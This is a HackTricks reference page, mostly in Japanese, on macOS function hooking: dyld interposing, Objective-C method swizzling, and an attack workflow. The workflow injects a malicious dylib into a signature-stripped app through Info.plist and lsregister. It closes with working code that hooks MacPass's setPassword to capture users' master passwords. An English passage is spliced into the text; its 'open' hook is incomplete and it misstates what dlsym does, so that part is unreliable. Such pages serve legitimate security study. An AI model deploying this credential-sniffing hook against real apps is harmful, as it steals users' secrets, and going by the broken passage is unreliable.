# macOS Function Hooking

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**か**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f)**または**[**Telegramグループ**](https://t.me/peass)**に参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)を**フォロー**する。
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## 関数インターポージング

**`__interpose`セクション（または`S_INTERPOSING`フラグが付いたセクション）を含む関数ポインタ**のタプルを持つ**dylib**を作成し、**元の**関数と**置換**関数を参照します。

その後、**`DYLD_INSERT_LIBRARIES`でdylibをインジェクト**します（インターポージングはメインアプリがロードされる前に発生する必要があります）。明らかに、[**`DYLD_INSERT_LIBRARIES`の使用に適用される制限**はここでも適用されます](macos-library-injection/#check-restrictions)。

### printfをインターポース

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}

```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```

#### macOS Function Hooking

macOS provides a feature called Interpose, which allows you to intercept and replace functions in shared libraries. This can be used for various purposes, including debugging, logging, and even modifying the behavior of applications.

To use Interpose, you need to create a new shared library that contains the replacement functions. Then, you can use the `DYLD_INSERT_LIBRARIES` environment variable to load your library into the target process and intercept the desired functions.

Here is an example of using Interpose to hook the `open` function:

```c
#define _DARWIN_C_SOURCE
#include <stdio.h>
#include <dlfcn.h>

int (*original_open)(const char *path, int oflag, ...);

int my_open(const char *path, int oflag, ...) {
    // Your custom implementation here
}

__attribute__((constructor))
void init() {
    original_open = dlsym(RTLD_NEXT, "open");
    if (original_open == NULL) {
        fprintf(stderr, "Error hooking open\n");
    }
    printf("Hooked open function\n");
}
```

In this example, the `init` function is called when the library is loaded into the process. It uses `dlsym` to get a reference to the original `open` function, which is then replaced with `my_open`. This allows you to intercept and modify the behavior of the `open` function.

Remember that function hooking can be a powerful technique, but it should be used responsibly and ethically. Improper use of function hooking can lead to instability and security vulnerabilities in the target system.

```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```

## メソッドスウィズリング

ObjectiveCでは、メソッドは次のように呼び出されます: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

**オブジェクト**、**メソッド**、**パラメータ**が必要です。メソッドが呼び出されると、**`objc_msgSend`** 関数を使用して **msg が送信**されます: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

オブジェクトは **`someObject`**、メソッドは **`@selector(method1p1:p2:)`** で、引数は **value1**、**value2** です。

オブジェクト構造に従って、メソッドの **名前** と **メソッドコードへのポインタ** が **格納**されている **メソッドの配列** にアクセスすることができます。

{% hint style="danger" %}
メソッドやクラスは名前に基づいてアクセスされるため、この情報はバイナリに保存されているため、`otool -ov </path/bin>` または [`class-dump </path/bin>`](https://github.com/nygard/class-dump) を使用して取得することができます。
{% endhint %}

### 生のメソッドへのアクセス

次の例のように、メソッドの情報（名前、パラメータ数、アドレスなど）にアクセスすることができます。

```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```

### method\_exchangeImplementationsを使用したメソッドスイズリング

関数\*\*`method_exchangeImplementations`\*\*は、**1つの関数の実装のアドレスを他の関数に変更**することを可能にします。

{% hint style="danger" %}
したがって、関数が呼び出されるときには、**実行されるのは他の関数**です。
{% endhint %}

```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```

{% hint style="warning" %}
この場合、**正規**メソッドの**実装コード**が**メソッド名**を**検証**すると、このスウィズリングを**検出**して実行を防ぐことができます。

次のテクニックにはこの制限がありません。
{% endhint %}

### method\_setImplementationを使用したメソッドスウィズリング

前の形式は奇妙です。なぜなら、1つのメソッドの実装をもう1つのメソッドに変更しているからです。**`method_setImplementation`** 関数を使用すると、1つのメソッドの**実装**を**他のメソッド**に変更できます。

新しい実装から呼び出す場合は、後でそのアドレスを特定するのが難しくなるため、**元の実装のアドレスを保存**してから上書きすることを忘れないでください。

```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```

## フック攻撃方法論

このページでは、関数をフックするさまざまな方法について説明しました。ただし、これらは**プロセス内でコードを実行して攻撃する**というものでした。

そのためには、最も簡単な技術としては、[Dyldを環境変数またはハイジャックを介して注入する](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)という方法があります。ただし、[Dylibプロセスインジェクション](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)を介して行うこともできると思われます。

ただし、これらのオプションは**保護されていない**バイナリ/プロセスに**限定**されています。制限について詳しく知るには、各技術を確認してください。

ただし、関数フック攻撃は非常に特定されたものであり、攻撃者はこれを行って**プロセス内の機密情報を盗み出す**ことを意図しています（そうでなければプロセスインジェクション攻撃を行うでしょう）。そして、この機密情報はMacPassなどのユーザーがダウンロードしたアプリケーション内に存在する可能性があります。

したがって、攻撃者の手法は、脆弱性を見つけるか、アプリケーションの署名を削除し、Info.plistを介して\*\*`DYLD_INSERT_LIBRARIES`\*\*環境変数を注入することです。以下のようなものを追加します：

```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```

そしてアプリケーションを**再登録**してください：

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

そのライブラリに、情報を外部に送信するフックコードを追加します：パスワード、メッセージ...

{% hint style="danger" %}
新しいバージョンのmacOSでは、アプリケーションバイナリの署名を**削除**し、それが以前に実行されていた場合、macOSはもはやそのアプリケーションを実行しなくなります。
{% endhint %}

#### ライブラリの例

```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```

## 参考

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 で **@carlospolopm** をフォローする
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する

</details>
